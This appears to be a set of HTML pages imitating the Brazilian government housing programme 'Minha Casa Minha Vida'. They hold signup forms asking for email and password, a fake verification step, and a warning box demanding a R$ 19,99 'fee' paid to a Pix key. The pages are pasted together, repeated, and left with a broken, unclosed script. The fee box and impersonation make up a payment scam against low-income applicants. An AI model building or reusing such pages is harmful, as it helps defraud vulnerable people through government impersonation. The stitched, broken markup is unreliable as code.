<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f4f4f4;
    }
    header {
      background: #004aad;
      color: white;
      text-align: center;
      padding: 20px;
    }
    header img {
      max-width: 150px;
      margin-bottom: 10px;
    }
    nav {
      background: #003399;
      padding: 10px;
      text-align: center;
    }
    nav a {
      color: white;
      margin: 0 10px;
      text-decoration: none;
      font-weight: bold;
    }
    section {
      padding: 30px 20px;
      background: white;
      max-width: 900px;
      margin: auto;
    }
    h2 {
      color: #004aad;
    }
    img {
      width: 100%;
      height: auto;
      margin-top: 15px;
      border-radius: 8px;
    }
    input, button {
      display: block;
      width: 100%;
      max-width: 400px;
      padding: 10px;
      margin: 10px 0;
    }
    footer {
      background: #004aad;
      color: white;
      text-align: center;
      padding: 15px;
    }
  </style>
</head>
<body>

<header>
  <img src="logo-mcmv.jpg" alt="Logo Minha Casa Minha Vida">
  <h1>Minha Casa Minha Vida</h1>
</header>

<nav>
  <a href="#programa">Programa</a>
  <a href="#cadastro">Cadastro</a>
  <a href="#requisitos">Requisitos</a>
  <a href="#documentos">Documentos</a>
  <a href="#passos">Funcionamento</a>
  <a href="#beneficios">Benefícios</a>
  <a href="#simulador">Simulador</a>
  <a href="#inscricao">Inscrição</a>
  <a href="#empreendimentos">Empreendimentos</a>
  <a href="#depoimentos">Depoimentos</a>
  <a href="#parceiros">Parceiros</a>
  <a href="#noticias">Notícias</a>
  <a href="#contato">Contato</a>
</nav>

<section id="programa">
  <h2>Sobre o Programa</h2>
  <p>Facilitando o acesso à moradia digna para famílias brasileiras com renda limitada.</p>
  <img src="imagem-programa.jpg" alt="Imagem do programa Minha Casa Minha Vida">
</section>

<section id="cadastro">
  <h2>Cadastro</h2>
  <form onsubmit="event.preventDefault(); solicitarCodigo();">
    <input type="email" id="email" placeholder="Seu e-mail" required>
    <input type="password" id="senha" placeholder="Crie uma senha" required>
    <button type="submit">Cadastrar</button>
  </form>
  <div id="verificacao" style="display:none;">
    <p>Digite o código enviado: <strong>123456</strong></p>
    <input type="text" id="codigo" placeholder="Código de verificação">
    <button onclick="verificarCodigo()">Verificar</button>
    <p id="mensagem-codigo"></p>
  </div>
</section>

<section id="requisitos">
  <h2>Requisitos</h2>
  <ul>
    <li>Ser maior de 18 anos</li>
    <li>Não possuir imóvel próprio</li>
    <li>Renda familiar dentro das faixas permitidas</li>
  </ul>
</section>

<section id="documentos">
  <h2>Documentos Necessários</h2>
  <ul>
    <li>RG e CPF</li>
    <li>Comprovante de renda</li>
    <li>Comprovante de residência</li>
    <li>Certidão de nascimento ou casamento</li>
  </ul>
</section>

<section id="passos">
  <h2>Como Funciona</h2>
  <ol>
    <li>Faça seu cadastro</li>
    <li>Envie os documentos</li>
    <li>Aguarde análise</li>
    <li>Assine o contrato</li>
    <li>Receba as chaves do imóvel</li>
  </ol>
</section>

<section id="beneficios">
  <h2>Benefícios</h2>
  <ul>
    <li>Subsídios do governo</li>
    <li>Juros baixos</li>
    <li>Parcelas acessíveis</li>
    <li>Imóveis bem localizados</li>
  </ul>
</section>

<section id="simulador">
  <h2>Simulador de Financiamento</h2>
  <input type="number" id="renda" placeholder="Digite sua renda mensal">
  <button onclick="simularParcela()">Simular</button>
  <p id="resultado"></p>
</section>

<section id="inscricao">
  <h2>Inscrição</h2>
  <form>
    <input type="text" placeholder="Nome completo" required>
    <input type="email" placeholder="E-mail" required>
    <input type="number" placeholder="Renda familiar" required>
    <input type="text" placeholder="Cidade" required>
    <button type="submit">Enviar</button>
  </form>
</section>

<section id="empreendimentos">
  <h2>Empreendimentos Disponíveis</h2>
  <img src="imagem-empreendimento.jpg" alt="Empreendimento Minha Casa Minha Vida">
  <ul>
    <li>SP - Zona Leste</li>
    <li>RJ - Nova Iguaçu</li>
    <li>MG - Contagem</li>
    <li>PE - Jaboatão</li>
  </ul>
</section>

<section id="depoimentos">
  <h2>Depoimentos</h2>
  <img src="imagem-familia.jpg" alt="Família feliz">
  <blockquote>“Conseguimos realizar nosso sonho com o Minha Casa Minha Vida!” – Ana e Carlos</blockquote>
  <blockquote>“O processo foi rápido e o imóvel é ótimo!” – Joana Souza</blockquote>
</section>

<section id="parceiros">
  <h2>Área para Parceiros</h2>
  <p>Construtoras, prefeituras e entidades podem se credenciar para participar do programa.</p>
</section>

<section id="noticias">
  <h2>Notícias e Atualizações</h2>
  <ul>
    <li><strong>Abril 2025:</strong> Novo empreendimento em Salvador com 300 unidades!</li>
    <li><strong>Março 2025:</strong> Faixa 1 tem aumento no subsídio máximo.</li>
  </ul>
</section>

<section id="contato">
  <h2>Contato</h2>
  <p>Email: atendimento@minhacasaminhavida.gov.br</p>
  <p>Telefone: 0800 000 0000</p>
  <p>Segunda a Sexta, das 8h às 17h</p>
</section>

<footer>
  © 2025 Minha Casa Minha Vida – Todos os direitos reservados.
</footer>

<script>
  function solicitarCodigo() {
    alert("Código de verificação enviado: 123456");
    document.getElementById('verificacao').style.display = "block";
  }

  function verificarCodigo() {
    const codigo = document.getElementById('codigo').value;
    const msg = document.getElementById('mensagem-codigo');
    if (codigo === "123456") {
      msg.textContent = "Cadastro confirmado com sucesso!";
      msg.style.color = "green";
    } else {
      msg.textContent = "Código incorreto.";
      msg.style.color = "red";
    }
  }

  function simularParcela() {
    const renda = parseFloat(document.getElementById('renda').value);
    if (!renda) return;
    const parcela = renda * 0.3;
    document.getElementById('resultado').textContent = `Parcela estimada: R$ ${parcela.toFixed(2)}`;
  }
</script>

</body>
</html><section style="background: #fff8f0; border: 2px solid #ff9900; padding: 20px; margin: 30px auto; max-width: 600px; border-radius: 10px;">
  <h2 style="color: red; text-align: center;">⚠️ ATENÇÃO ⚠️</h2>
  <p style="font-size: 18px; color: #333; text-align: center;">
    Para participar do programa Minha Casa Minha Vida, é necessário pagar uma taxa única de <strong>R$ 19,99</strong>.
  </p>
  <p style="text-align: center; color: #555;">
    Esse valor ajuda no processo de cadastro e verificação de dados.
  </p>

  <div style="text-align: center; margin-top: 20px;">
    <button onclick="mostrarChavePix()" style="background-color: #004aad; color: white; padding: 12px 24px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer;">
      Pagar Taxa
    </button>
  </div>

  <div id="chavePix" style="display: none; margin-top: 20px; text-align: center;">
    <p><strong>Chave Pix:</strong></p>
    <input type="text" value="pix@minhacasaminhavida.gov.br" id="pixKey" readonly style="padding: 10px; width: 80%; font-size: 16px;">
    <br><br>
    <button onclick="copiarPix()" style="padding: 10px 20px; background-color: #0066cc; color: white; border: none; border-radius: 5px;">
      Copiar Chave Pix
    </button>
  </div>
</section>

<script>
  function mostrarChavePix() {
    document.getElementById('chavePix').style.display = 'block';
  }

  function copiarPix() {
    const pixInput = document.getElementById("pixKey");
    pixInput.select();
    pixInput.setSelectionRange(0, 99999);
    document.execCommand("copy");
    alert("Chave Pix copiada!");
  }


  <section>
    <h2>Bem-vindo</h2>
    <p>Este é o site do programa Minha Casa Minha Vida.</p>
  </section>

  <div id="loader">
    <div class="spinner"></div>
    <p>Carregando...</p>
  </div>
  <script><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }

    /* Tela de carregamento */
    #tela-carregamento {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: #f0f8ff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
    }

    .spinner {
      border: 6px solid #ccc;
      border-top: 6px solid #004aad;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #tela-carregamento h2 {
      font-size: 20px;
      text-align: center;
      color: #004aad;
      max-width: 80%;
    }

    /* Conteúdo principal */
    #conteudo-principal {
      display: none;
      padding: 30px;
      text-align: center;
      animation: aparecer 3s ease;
    }

    @keyframes aparecer {
      0% {
        opacity: 0;
        transform: scale(0.9);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>

<div id="tela-carregamento">
  <div class="spinner"></div>
  <h2>"Realizar o sonho da casa própria está mais perto do que nunca!"</h2>
</div>

<div id="conteudo-principal">
  <h1>Bem-vindo ao Minha Casa Minha Vida</h1>
  <p>Aqui você encontra tudo que precisa para conquistar seu lar!</p>
</div>

<script>
  setTimeout(() => {
    document.getElementById('tela-carregamento').style.display = 'none';
    const conteudo = document.getElementById('conteudo-principal');
    conteudo.style.display = 'block';
  }, 4000); // 4 segundos
</script>

</body>
</html><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }

    /* Tela de carregamento */
    #tela-carregamento {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #f0f8ff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 10000;
    }

    .spinner {
      border: 8px solid #ddd;
      border-top: 8px solid #004aad;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #tela-carregamento h2 {
      font-size: 18px;
      text-align: center;
      color: #004aad;
      max-width: 80%;
    }

    /* Animação de entrada */
    @keyframes aparecer {
      0% {
        opacity: 0;
        transform: scale(0.9);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }

    #conteudo-principal {
      display: none;
      padding: 30px;
      text-align: center;
      animation: aparecer 3s ease;
    }
  </style>
</head>
<body>

<!-- Tela de carregamento -->
<div id="tela-carregamento">
  <div class="spinner"></div>
  <h2>"Realizar o sonho da casa própria está mais perto do que nunca!"</h2>
</div>

<!-- Conteúdo do site -->
<div id="conteudo-principal">
  <h1>Bem-vindo ao Minha Casa Minha Vida</h1>
  <p>Aqui você encontra tudo o que precisa para conquistar seu novo lar!</p>
</div>

<script>
  // Após 4 segundos, esconde a tela de carregamento e mostra o conteúdo
  setTimeout(() => {
    document.getElementById('tela-carregamento').style.display = 'none';
    document.getElementById('conteudo-principal').style.display = 'block';
  }, 4000);
</script>

</body>
</html><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f4f4f4;
    }
    header {
      background: #004aad;
      color: white;
      text-align: center;
      padding: 20px;
    }
    header img {
      max-width: 150px;
      margin-bottom: 10px;
    }
    nav {
      background: #003399;
      padding: 10px;
      text-align: center;
    }
    nav a {
      color: white;
      margin: 0 10px;
      text-decoration: none;
      font-weight: bold;
    }
    section {
      padding: 30px 20px;
      background: white;
      max-width: 900px;
      margin: auto;
    }
    h2 {
      color: #004aad;
    }
    img {
      width: 100%;
      height: auto;
      margin-top: 15px;
      border-radius: 8px;
    }
    input, button {
      display: block;
      width: 100%;
      max-width: 400px;
      padding: 10px;
      margin: 10px 0;
    }
    footer {
      background: #004aad;
      color: white;
      text-align: center;
      padding: 15px;
    }
  </style>
</head>
<body>

<header>
  <img src="logo-mcmv.jpg" alt="Logo Minha Casa Minha Vida">
  <h1>Minha Casa Minha Vida</h1>
</header>

<nav>
  <a href="#programa">Programa</a>
  <a href="#cadastro">Cadastro</a>
  <a href="#requisitos">Requisitos</a>
  <a href="#documentos">Documentos</a>
  <a href="#passos">Funcionamento</a>
  <a href="#beneficios">Benefícios</a>
  <a href="#simulador">Simulador</a>
  <a href="#inscricao">Inscrição</a>
  <a href="#empreendimentos">Empreendimentos</a>
  <a href="#depoimentos">Depoimentos</a>
  <a href="#parceiros">Parceiros</a>
  <a href="#noticias">Notícias</a>
  <a href="#contato">Contato</a>
</nav>

<section id="programa">
  <h2>Sobre o Programa</h2>
  <p>Facilitando o acesso à moradia digna para famílias brasileiras com renda limitada.</p>
  <img src="imagem-programa.jpg" alt="Imagem do programa Minha Casa Minha Vida">
</section>

<section id="cadastro">
  <h2>Cadastro</h2>
  <form onsubmit="event.preventDefault(); solicitarCodigo();">
    <input type="email" id="email" placeholder="Seu e-mail" required>
    <input type="password" id="senha" placeholder="Crie uma senha" required>
    <button type="submit">Cadastrar</button>
  </form>
  <div id="verificacao" style="display:none;">
    <p>Digite o código enviado: <strong>123456</strong></p>
    <input type="text" id="codigo" placeholder="Código de verificação">
    <button onclick="verificarCodigo()">Verificar</button>
    <p id="mensagem-codigo"></p>
  </div>
</section>

<section id="requisitos">
  <h2>Requisitos</h2>
  <ul>
    <li>Ser maior de 18 anos</li>
    <li>Não possuir imóvel próprio</li>
    <li>Renda familiar dentro das faixas permitidas</li>
  </ul>
</section>

<section id="documentos">
  <h2>Documentos Necessários</h2>
  <ul>
    <li>RG e CPF</li>
    <li>Comprovante de renda</li>
    <li>Comprovante de residência</li>
    <li>Certidão de nascimento ou casamento</li>
  </ul>
</section>

<section id="passos">
  <h2>Como Funciona</h2>
  <ol>
    <li>Faça seu cadastro</li>
    <li>Envie os documentos</li>
    <li>Aguarde análise</li>
    <li>Assine o contrato</li>
    <li>Receba as chaves do imóvel</li>
  </ol>
</section>

<section id="beneficios">
  <h2>Benefícios</h2>
  <ul>
    <li>Subsídios do governo</li>
    <li>Juros baixos</li>
    <li>Parcelas acessíveis</li>
    <li>Imóveis bem localizados</li>
  </ul>
</section>

<section id="simulador">
  <h2>Simulador de Financiamento</h2>
  <input type="number" id="renda" placeholder="Digite sua renda mensal">
  <button onclick="simularParcela()">Simular</button>
  <p id="resultado"></p>
</section>

<section id="inscricao">
  <h2>Inscrição</h2>
  <form>
    <input type="text" placeholder="Nome completo" required>
    <input type="email" placeholder="E-mail" required>
    <input type="number" placeholder="Renda familiar" required>
    <input type="text" placeholder="Cidade" required>
    <button type="submit">Enviar</button>
  </form>
</section>

<section id="empreendimentos">
  <h2>Empreendimentos Disponíveis</h2>
  <img src="imagem-empreendimento.jpg" alt="Empreendimento Minha Casa Minha Vida">
  <ul>
    <li>SP - Zona Leste</li>
    <li>RJ - Nova Iguaçu</li>
    <li>MG - Contagem</li>
    <li>PE - Jaboatão</li>
  </ul>
</section>

<section id="depoimentos">
  <h2>Depoimentos</h2>
  <img src="imagem-familia.jpg" alt="Família feliz">
  <blockquote>“Conseguimos realizar nosso sonho com o Minha Casa Minha Vida!” – Ana e Carlos</blockquote>
  <blockquote>“O processo foi rápido e o imóvel é ótimo!” – Joana Souza</blockquote>
</section>

<section id="parceiros">
  <h2>Área para Parceiros</h2>
  <p>Construtoras, prefeituras e entidades podem se credenciar para participar do programa.</p>
</section>

<section id="noticias">
  <h2>Notícias e Atualizações</h2>
  <ul>
    <li><strong>Abril 2025:</strong> Novo empreendimento em Salvador com 300 unidades!</li>
    <li><strong>Março 2025:</strong> Faixa 1 tem aumento no subsídio máximo.</li>
  </ul>
</section>

<section id="contato">
  <h2>Contato</h2>
  <p>Email: atendimento@minhacasaminhavida.gov.br</p>
  <p>Telefone: 0800 000 0000</p>
  <p>Segunda a Sexta, das 8h às 17h</p>
</section>

<footer>
  © 2025 Minha Casa Minha Vida – Todos os direitos reservados.
</footer>

<script>
  function solicitarCodigo() {
    alert("Código de verificação enviado: 123456");
    document.getElementById('verificacao').style.display = "block";
  }

  function verificarCodigo() {
    const codigo = document.getElementById('codigo').value;
    const msg = document.getElementById('mensagem-codigo');
    if (codigo === "123456") {
      msg.textContent = "Cadastro confirmado com sucesso!";
      msg.style.color = "green";
    } else {
      msg.textContent = "Código incorreto.";
      msg.style.color = "red";
    }
  }

  function simularParcela() {
    const renda = parseFloat(document.getElementById('renda').value);
    if (!renda) return;
    const parcela = renda * 0.3;
    document.getElementById('resultado').textContent = `Parcela estimada: R$ ${parcela.toFixed(2)}`;
  }
</script>

</body>
</html><section style="background: #fff8f0; border: 2px solid #ff9900; padding: 20px; margin: 30px auto; max-width: 600px; border-radius: 10px;">
  <h2 style="color: red; text-align: center;">⚠️ ATENÇÃO ⚠️</h2>
  <p style="font-size: 18px; color: #333; text-align: center;">
    Para participar do programa Minha Casa Minha Vida, é necessário pagar uma taxa única de <strong>R$ 19,99</strong>.
  </p>
  <p style="text-align: center; color: #555;">
    Esse valor ajuda no processo de cadastro e verificação de dados.
  </p>

  <div style="text-align: center; margin-top: 20px;">
    <button onclick="mostrarChavePix()" style="background-color: #004aad; color: white; padding: 12px 24px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer;">
      Pagar Taxa
    </button>
  </div>

  <div id="chavePix" style="display: none; margin-top: 20px; text-align: center;">
    <p><strong>Chave Pix:</strong></p>
    <input type="text" value="pix@minhacasaminhavida.gov.br" id="pixKey" readonly style="padding: 10px; width: 80%; font-size: 16px;">
    <br><br>
    <button onclick="copiarPix()" style="padding: 10px 20px; background-color: #0066cc; color: white; border: none; border-radius: 5px;">
      Copiar Chave Pix
    </button>
  </div>
</section>

<script>
  function mostrarChavePix() {
    document.getElementById('chavePix').style.display = 'block';
  }

  function copiarPix() {
    const pixInput = document.getElementById("pixKey");
    pixInput.select();
    pixInput.setSelectionRange(0, 99999);
    document.execCommand("copy");
    alert("Chave Pix copiada!");
  }


  <section>
    <h2>Bem-vindo</h2>
    <p>Este é o site do programa Minha Casa Minha Vida.</p>
  </section>

  <div id="loader">
    <div class="spinner"></div>
    <p>Carregando...</p>
  </div>
  <script><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }

    /* Tela de carregamento */
    #tela-carregamento {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: #f0f8ff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
    }

    .spinner {
      border: 6px solid #ccc;
      border-top: 6px solid #004aad;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #tela-carregamento h2 {
      font-size: 20px;
      text-align: center;
      color: #004aad;
      max-width: 80%;
    }

    /* Conteúdo principal */
    #conteudo-principal {
      display: none;
      padding: 30px;
      text-align: center;
      animation: aparecer 3s ease;
    }

    @keyframes aparecer {
      0% {
        opacity: 0;
        transform: scale(0.9);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>

<div id="tela-carregamento">
  <div class="spinner"></div>
  <h2>"Realizar o sonho da casa própria está mais perto do que nunca!"</h2>
</div>

<div id="conteudo-principal">
  <h1>Bem-vindo ao Minha Casa Minha Vida</h1>
  <p>Aqui você encontra tudo que precisa para conquistar seu lar!</p>
</div>

<script>
  setTimeout(() => {
    document.getElementById('tela-carregamento').style.display = 'none';
    const conteudo = document.getElementById('conteudo-principal');
    conteudo.style.display = 'block';
  }, 4000); // 4 segundos
</script>

</body>
</html><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Minha Casa Minha Vida</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }

    /* Tela de carregamento */
    #tela-carregamento {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #f0f8ff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 10000;
    }

    .spinner {
      border: 8px solid #ddd;
      border-top: 8px solid #004aad;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #tela-carregamento h2 {
      font-size: 18px;
      text-align: center;
      color: #004aad;
      max-width: 80%;
    }

    /* Animação de entrada */
    @keyframes aparecer {
      0% {
        opacity: 0;
        transform: scale(0.9);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }

    #conteudo-principal {
      display: none;
      padding: 30px;
      text-align: center;
      animation: aparecer 3s ease;
    }
  </style>
</head>
<body>

<!-- Tela de carregamento -->
<div id="tela-carregamento">
  <div class="spinner"></div>
  <h2>"Realizar o sonho da casa própria está mais perto do que nunca!"</h2>
</div>

<!-- Conteúdo do site -->
<div id="conteudo-principal">
  <h1>Bem-vindo ao Minha Casa Minha Vida</h1>
  <p>Aqui você encontra tudo o que precisa para conquistar seu novo lar!</p>
</div>

<script>
  // Após 4 segundos, esconde a tela de carregamento e mostra o conteúdo
  setTimeout(() => {
    document.getElementById('tela-carregamento').style.display = 'none';
    document.getElementById('conteudo-principal').style.display = 'block';
  }, 4000);
</script>

</body>
</html>0bj
